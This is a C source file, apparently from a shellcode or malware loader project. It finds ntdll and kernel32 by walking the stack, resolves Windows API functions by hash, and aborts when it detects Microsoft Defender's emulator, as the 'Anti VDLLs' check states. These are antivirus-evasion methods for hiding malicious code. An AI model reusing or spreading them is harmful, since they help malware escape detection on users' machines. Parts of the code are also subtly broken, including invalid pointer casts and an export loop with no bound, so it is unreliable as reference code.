#include "SelfAchive.h"

ULONG_PTR GetModuleBase(_In_ PULONG_PTR pulAddress)
{
	while (TRUE)
	{
		if (*pulAddress == 0x0000000300905A4D)
		{
			break;
		}
		((ULONG_PTR)pulAddress)--;

	}
	return pulAddress;
}


BOOL GetImageBaseByStack(_Out_ PULONG_PTR  pulKernel32Base, _Out_ PULONG_PTR pulNtdllBase)
{

	PTEB*		pTeb				= NtCurrentTeb();
	PULONG_PTR	pulStackBase		= (PULONG_PTR)((ULONG_PTR)pTeb + 0x8);
	PULONG_PTR	pulTravereAddress	= *pulStackBase;
	ULONG_PTR   ulStackBase			= *pulStackBase;
	pulTravereAddress -= 0x8;

	while (!*pulNtdllBase || !*pulKernel32Base)
	{

		if (*pulTravereAddress)
		{
			if (!*pulNtdllBase && *pulTravereAddress > 0x7FF000000000)
			{
				*pulNtdllBase = *pulTravereAddress;
				printf("[+] Ntdll!RtlUserThreadStart+0x21 0x%llx \n", *pulNtdllBase);
			}
			else if (!*pulKernel32Base && *pulTravereAddress > 0x7FF000000000)
			{
				*pulKernel32Base = *pulTravereAddress;
				printf("[+] Kernel32!BaseThreadInitThunk+0x14 0x%llx \n", *pulKernel32Base);
			}

		}
		pulTravereAddress--;
	}

	if (!*pulNtdllBase || !*pulKernel32Base)
	{
		return FALSE;
	}

	*pulNtdllBase = GetModuleBase(*pulNtdllBase);
	*pulKernel32Base = GetModuleBase(*pulKernel32Base);

	return TRUE;
}

PVOID GetProcAddressByHash(ULONG_PTR ulDllBase,DWORD dwTargetHash)
{

    PIMAGE_DOS_HEADER pImgDosHead				= (PIMAGE_DOS_HEADER)ulDllBase;
    PIMAGE_NT_HEADERS modulePEHeader			= (PIMAGE_NT_HEADERS)(ulDllBase + pImgDosHead->e_lfanew);


	PIMAGE_DATA_DIRECTORY	pImgExportDataDir	= &modulePEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY pImgExportDir		= (PIMAGE_EXPORT_DIRECTORY)(ulDllBase + pImgExportDataDir->VirtualAddress);
    ULONG_PTR				ulNameArray			= ulDllBase + pImgExportDir->AddressOfNames;
    ULONG_PTR				ulOrdinalArray		= ulDllBase + pImgExportDir->AddressOfNameOrdinals;
	ULONG_PTR				ulAddressArray		= ulDllBase + pImgExportDir->AddressOfFunctions;

    while (ulNameArray)
    {
        DWORD dwFunctionNameHash = HASHa((char*)(ulDllBase + *(DWORD*)(ulNameArray)));

        // Anti VDLLs / Defender emulator
        if (dwFunctionNameHash == 0x62B67FEE) __fastfail(0xc00000022);

        if (dwFunctionNameHash == dwTargetHash)
        {

			ulAddressArray += *(WORD*)(ulOrdinalArray) * sizeof(DWORD);

			return ulDllBase + *(DWORD*)(ulAddressArray);
        }

        ulNameArray += sizeof(DWORD);
        ulOrdinalArray += sizeof(WORD);
    }

    return NULL;
}

BOOL _memcpy(void* dest, void* src, size_t size) 
{
	if (dest == NULL || src == NULL)
	{
		return FALSE;
	}
	char* csrc = (char*)src;
	char* cdest = (char*)dest;
	for (size_t i = 0; i < size; i++)
	{
		cdest[i] = csrc[i];
	}
	return TRUE;
}


wchar_t* GetDllName(const wchar_t* fullDllName) 
{
	const wchar_t* pszTempDllName = fullDllName;
	wchar_t* pszDllName = (wchar_t*)fullDllName; 

	while (*pszTempDllName++) {} 

	while (--pszTempDllName >= fullDllName)
	{
		if (*pszTempDllName == L'\\') {
			pszDllName = (wchar_t*)pszTempDllName + 1;
			break;  
		}
	}

	return pszDllName;  
}

void _RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
	if (SourceString == NULL) {
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
		DestinationString->Buffer = NULL;
	}
	else {
		size_t size = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)size;
		DestinationString->MaximumLength = (USHORT)(size + sizeof(WCHAR));
		DestinationString->Buffer = (PWSTR)SourceString;
	}
}